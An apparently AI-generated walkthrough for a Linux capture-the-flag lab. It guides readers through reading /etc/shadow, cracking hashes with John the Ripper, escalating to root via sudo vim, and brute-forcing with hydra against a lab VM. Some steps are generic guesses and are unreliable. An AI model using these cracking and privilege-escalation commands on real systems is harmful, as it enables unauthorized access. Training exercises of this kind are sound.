This **Scavenger Hunt CTF** challenge is designed to test your **Linux forensics, privilege escalation, and security analysis skills**. Below is a **step-by-step guide** to help you and your team complete each flag.  

---

## **🚀 Step 1: Start the VM and Log In**
### **Start the Virtual Machine:**
1. Open the terminal and run:  
   ```bash
   sudo /home/sysadmin/Documents/scavenger-hunt/scavenger-hunt-start.sh
   ```
2. Select **option 1** to start the server.
3. Wait for the installation to complete.
4. SSH into the VM:
   ```bash
   ssh student@192.168.200.105
   ```
5. Enter the password:  
   ```
   Goodluck!
   ```

---

# **🏆 Flag Walkthrough**
## **🏁 Flag 1: Find the Leaked Password File**
**Hint:** "It doesn't have a great hiding spot" suggests it may be in a commonly used **system directory**.

🔹 **Check for readable files related to passwords:**
```bash
find / -name "*password*" 2>/dev/null
```
🔹 **Common password locations:**  
```bash
cat /etc/passwd  
cat /etc/shadow  
cat ~/.bash_history  
```
🔹 **If it's a hidden file, check home directories:**
```bash
ls -la /home/student
```
🔹 **Look for world-readable files:**
```bash
find / -type f -readable 2>/dev/null | grep "password"
```
💡 **Write down any passwords you find.**

---

## **🏁 Flag 2: Find and Crack a Hacker’s Password**
🔹 **List users and find the hacker's account:**
```bash
cat /etc/passwd | grep bash
```
🔹 **Check for a hashed password in `/etc/shadow`:**
```bash
sudo cat /etc/shadow | grep <hacker-username>
```
🔹 **Crack the password using `john` (John the Ripper):**
```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow
```
🔹 **Log in as the user once cracked:**
```bash
su - <hacker-username>
```

---

## **🏁 Flag 3: Analyze Log Files & Find a Zip**
🔹 **Find log files related to the hacker's name:**
```bash
find /var/log -type f -name "*.log" 2>/dev/null
```
🔹 **Find zip files:**
```bash
find / -type f -name "*.zip" 2>/dev/null
```
🔹 **Unzip the file and analyze it:**
```bash
unzip <filename>.zip
cat <unzipped_file>
```
🔹 **Find unique IPs in the log file:**
```bash
cat <logfile> | awk '{print $1}' | sort | uniq | wc -l
```
💡 **The number of unique IPs is the password!**

---

## **🏁 Flag 4: Find a Restricted File in a Hackers Directory**
🔹 **Find a list of hackers:**
```bash
find / -type d -name "hackers" 2>/dev/null
```
🔹 **Find the file with special permissions:**
```bash
find / -type f -perm 100
```
🔹 **Read the flag file:**
```bash
cat <filename>
```

---

## **🏁 Flag 5: Debug a Bash Script**
🔹 **Find user scripts:**
```bash
find /home -type f -name "*.sh"
```
🔹 **Check if it's executable:**
```bash
ls -l <script.sh>
```
🔹 **If not, give execute permission:**
```bash
chmod +x <script.sh>
```
🔹 **Run it with debugging mode:**
```bash
bash -x <script.sh>
```
🔹 **Fix any errors and re-run it to get the flag.**

---

## **🏁 Flag 6: Inspect Aliases**
🔹 **Check for user aliases:**
```bash
alias
cat ~/.bashrc | grep alias
```
🔹 **Find and execute the suspicious alias:**
```bash
<alias_name>
```

---

## **🏁 Flag 7: Exploit & Gain Root**
🔹 **Find SUID binaries that can be exploited:**
```bash
find / -perm -4000 2>/dev/null
```
🔹 **Check if any binary allows privilege escalation:**
```bash
sudo -l
```
🔹 **If `vim` is listed, escalate privileges:**
```bash
sudo vim -c '!sh'
```
🔹 **If there's a vulnerable program, compile an exploit:**
```bash
gcc exploit.c -o exploit
./exploit
```
🔹 **Switch to root:**
```bash
su root
```
🔹 **Find root's flag:**
```bash
cat /root/root.txt
```

---

## **🏁 Flag 8: Combine All Flags & Crack the Password**
🔹 **Save all flags in a file:**
```bash
echo "flag_1:xxxxx" > all_flags.txt
echo "flag_2:xxxxx" >> all_flags.txt
...
```
🔹 **Use `john` to crack them:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt all_flags.txt
```
🔹 **The final cracked flag is the answer! 🎯**

---

# **🎯 Bonus Challenges**
✅ **Use `hydra` to brute-force services**  
✅ **Find hidden directories with `dirb`**  
✅ **Exploit a vulnerable cron job**  

Would you like a **write-up template** for your findings? 🚀